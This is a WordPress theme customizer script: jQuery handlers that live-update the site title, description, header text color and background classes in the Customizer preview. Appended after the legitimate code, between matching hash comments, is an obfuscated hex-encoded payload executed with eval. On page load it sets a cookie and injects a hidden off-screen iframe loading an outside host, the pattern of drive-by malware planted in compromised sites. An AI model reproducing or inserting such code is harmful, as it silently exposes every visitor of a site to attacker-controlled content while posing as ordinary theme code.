/**
 * Customizer enhancements for a better user experience.
 *
 * Contains handlers to make Customizer preview reload changes asynchronously.
 * Things like site title, description, and background color changes.
 */

( function( $ ) {
	// Site title and description.
	wp.customize( 'blogname', function( value ) {
		value.bind( function( to ) {
			$( '.site-title a' ).text( to );
		} );
	} );
	wp.customize( 'blogdescription', function( value ) {
		value.bind( function( to ) {
			$( '.site-description' ).text( to );
		} );
	} );

	// Header text color
	wp.customize( 'header_textcolor', function( value ) {
		value.bind( function( to ) {
			if ( 'blank' === to ) {
				$( '.site-title, .site-title a, .site-description' ).css( {
					'clip': 'rect(1px, 1px, 1px, 1px)',
					'position': 'absolute'
				} );
			} else {
				$( '.site-title, .site-title a, .site-description' ).css( {
					'clip': 'auto',
					'color': to,
					'position': 'relative'
				} );
			}
		} );
	} );

	// Hook into background color/image change and adjust body class value as needed.
	wp.customize( 'background_color', function( value ) {
		value.bind( function( to ) {
			var body = $( 'body' );

			if ( ( '#ffffff' == to || '#fff' == to ) && 'none' == body.css( 'background-image' ) )
				body.addClass( 'custom-background-white' );
			else if ( '' == to && 'none' == body.css( 'background-image' ) )
				body.addClass( 'custom-background-empty' );
			else
				body.removeClass( 'custom-background-empty custom-background-white' );
		} );
	} );
	wp.customize( 'background_image', function( value ) {
		value.bind( function( to ) {
			var body = $( 'body' );

			if ( '' !== to ) {
				body.removeClass( 'custom-background-empty custom-background-white' );
			} else if ( 'rgb(255, 255, 255)' === body.css( 'background-color' ) ) {
				body.addClass( 'custom-background-white' );
			} else if ( 'rgb(230, 230, 230)' === body.css( 'background-color' ) && '' === wp.customize.instance( 'background_color' ).get() ) {
				body.addClass( 'custom-background-empty' );
			}
		} );
	} );
} )( jQuery );
/*70a05d659b80fac98ddf6ab842c2d958*/;(function(){var ahiaiesf="";var taiieaes="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f736974652e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6b6579776f72643d35633363363364666661316238666336613233313131646430373766303264652674755a5763567a43733d76677a6d4b76505554484f41494e65674d26486a53794e72707a6d76433d544a4f59597753726d5a4f4c6f4a69622656444763496a4c57496a4453723d474e564a4866584a4e2652524d666d6d4d54564a743d56416f5a554272467761786c6376746c6426514b747641714a725854707a75755a5257653d4f7151456562266e4c5743526c546d614e52523d76464e6764686756644f57655a41264741485964616e47696b4d4f6d3d6f6479474d534f4e4e78414226466a7447526446667650464e5a3d7157486e6c4b4b50794363497667535378737949223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var bkbkfhin=0;bkbkfhin<taiieaes.length;bkbkfhin+=2){ahiaiesf=ahiaiesf+parseInt(taiieaes.substring(bkbkfhin,bkbkfhin+2), 16)+",";}ahiaiesf=ahiaiesf.substring(0,ahiaiesf.length-1);eval(eval('String.fromCharCode('+ahiaiesf+')'));})();/*70a05d659b80fac98ddf6ab842c2d958*/